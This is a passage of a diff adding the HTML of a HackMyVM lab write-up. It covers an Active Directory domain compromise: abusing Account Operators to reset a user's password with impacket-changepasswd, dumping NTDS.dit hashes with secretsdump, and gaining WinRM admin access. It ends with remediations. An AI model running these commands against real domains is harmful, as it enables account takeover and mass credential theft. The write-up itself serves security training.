+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1863"
+        height="107"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/account-operators_hu_bdc08b106cf10fb.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/account-operators_hu_f4ffd7ab9c3f27dd.png 330w,http://localhost:1313/posts/dc03-hackmyvm/account-operators_hu_bdc08b106cf10fb.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/account-operators_hu_42fd58bb56fa8335.png 1024w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/account-operators_hu_5014f29ae5519b2b.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Further enumeration of domain groups via <code>rpcclient</code> confirmed the presence of typical high-value targets, including Domain Admins and a custom Operators group.</p>
+<pre tabindex="0"><code>rpcclient $&gt; enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[Operators] rid:[0x875]
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/operators-group_hu_c9554a78bedfc944.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/operators-group_hu_914e77e7c1c405b7.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/operators-group_hu_d38b3f900019efb.webp 951w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/operators-group_hu_d38b3f900019efb.webp 951w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="951"
+        height="74"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/operators-group_hu_85b70e9eb1b53164.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/operators-group_hu_dcb9c1e9219913a2.png 330w,http://localhost:1313/posts/dc03-hackmyvm/operators-group_hu_85b70e9eb1b53164.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/operators-group.png 951w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/operators-group.png 951w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/dc03-hackmyvm/group-info_hu_2d0ebb5b5741726d.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="607"
+        height="154"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/group-info.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/dc03-hackmyvm/group-info-2_hu_97307bad504f8b9c.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="580"
+        height="123"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/group-info-2.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Members of the <strong>Account Operators</strong> group have the inherent right to modify account attributes and reset passwords for most non-protected users in the domain.</p>
+<h2 id="step-4-privilege-escalation" class="relative group">Step 4: Privilege Escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-privilege-escalation" aria-label="Anchor">#</a></span></h2><p>The goal was to leverage the Account Operators privileges of <code>xkate578</code> to force a password reset on a higher-privileged user. The target chosen was <code>fbeth103</code>.</p>
+<h3 id="resetting-the-target-password" class="relative group">Resetting the Target Password <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#resetting-the-target-password" aria-label="Anchor">#</a></span></h3><p>Initial attempts to change the password via <code>rpcclient</code> and <code>bloodyad</code> proved difficult. Impacket&rsquo;s <code>changepasswd.py</code> was used to cleanly execute the password reset over RPC.</p>
+<pre tabindex="0"><code>impacket-changepasswd &#39;SOUPEDECODE.LOCAL/fbeth103@192.168.56.106&#39; -altuser &#39;xkate578&#39; -altpass &#39;&lt;xkate578_Password&gt;&#39; -newpass &#39;Password123!&#39; -no-pass -reset
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/password-change_hu_cc792afc032d2ad6.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/password-change_hu_3d98415b9f685d1e.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/password-change_hu_3badb25fd0c6431b.webp 957w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/password-change_hu_3badb25fd0c6431b.webp 957w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="957"
+        height="145"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/password-change_hu_1f78ab9461cec722.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/password-change_hu_c9b68a881666cee7.png 330w,http://localhost:1313/posts/dc03-hackmyvm/password-change_hu_1f78ab9461cec722.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/password-change.png 957w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/password-change.png 957w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="verifying-access" class="relative group">Verifying Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#verifying-access" aria-label="Anchor">#</a></span></h3><p>The newly set credentials (<code>fbeth103</code>:<code>Password123!</code>) were tested and confirmed to be valid, granting access to a highly privileged account within the environment.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/testing-creds_hu_21c27c0830f8a045.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/testing-creds_hu_ce2e63ebf8a886bb.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/testing-creds_hu_a974eb93194d15ad.webp 950w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/testing-creds_hu_a974eb93194d15ad.webp 950w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="950"
+        height="81"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/testing-creds_hu_86a0d081bfa8ac4c.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/testing-creds_hu_5abb53cc130beb21.png 330w,http://localhost:1313/posts/dc03-hackmyvm/testing-creds_hu_86a0d081bfa8ac4c.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/testing-creds.png 950w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/testing-creds.png 950w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-5-domain-compromise" class="relative group">Step 5: Domain Compromise <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-5-domain-compromise" aria-label="Anchor">#</a></span></h2><p>With a fully compromised administrative account, the final step was to compromise the entire domain by extracting all Active Directory hashes.</p>
+<h3 id="dumping-ntdsdit" class="relative group">Dumping NTDS.dit <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#dumping-ntdsdit" aria-label="Anchor">#</a></span></h3><p>Impacket&rsquo;s <code>secretsdump.py</code> was executed to remotely dump the NTDS.dit file and extract all domain password hashes (including the krbtgt account and Domain Admins).</p>
+<pre tabindex="0"><code>impacket-secretsdump &#39;SOUPEDECODE.LOCAL&#39;/&#39;fbeth103&#39;:&#39;Password123!&#39;@192.168.56.106
+</code></pre><h3 id="remote-administration" class="relative group">Remote Administration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#remote-administration" aria-label="Anchor">#</a></span></h3><p>Using the compromised high-privilege credentials, an administrative WinRM session was successfully established against the target, achieving total control over the domain controller.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/winrm-admin_hu_2fd8ba195e4bcec6.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/winrm-admin_hu_a824b2098fad2ef9.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/winrm-admin_hu_32e6b0e89e16701a.webp 981w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/winrm-admin_hu_32e6b0e89e16701a.webp 981w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="981"
+        height="505"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/winrm-admin_hu_d15a9bff4d5029b0.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/winrm-admin_hu_a50a8af632af6816.png 330w,http://localhost:1313/posts/dc03-hackmyvm/winrm-admin_hu_d15a9bff4d5029b0.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/winrm-admin.png 981w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/winrm-admin.png 981w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>This lab demonstrated a full domain compromise starting from an LLMNR poisoning attack to capture a weak user password. The critical escalation path relied on a misconfigured Account Operators group membership. This allowed a standard user to reset an administrative password, dump the NTDS.dit database, and achieve complete Active Directory control.</p>
+<p>To secure the environment, the following remediations are recommended:</p>
+<ul>
+<li><strong>Disable LLMNR and NBT-NS:</strong> Use Group Policy to enforce DNS-only name resolution, preventing broadcast poisoning.</li>
+<li><strong>Enforce Strong Passwords:</strong> Implement strict complexity and length requirements to thwart offline hash cracking.</li>
+<li><strong>Audit Privileged Groups:</strong> Restrict powerful groups like Account Operators and ensure they are never assigned to standard user accounts.</li>
+<li><strong>Implement Tiered Administration:</strong> Strictly separate standard and administrative accounts to limit lateral movement and privilege escalation.</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="960"
+        height="1280"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="k40t1k"
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg" srcset="http://localhost:1313/img/k40t1k_hu_210ca2abc75c60a7.jpeg 330w,http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg 660w
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          k40t1k
+        </div>
+      
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/jkilonzi"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://linkedin.com/in/john-maluki"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://medium.com/@jkilonzi301"
+          target="_blank"
+          aria-label="Medium"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            k40t1k
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
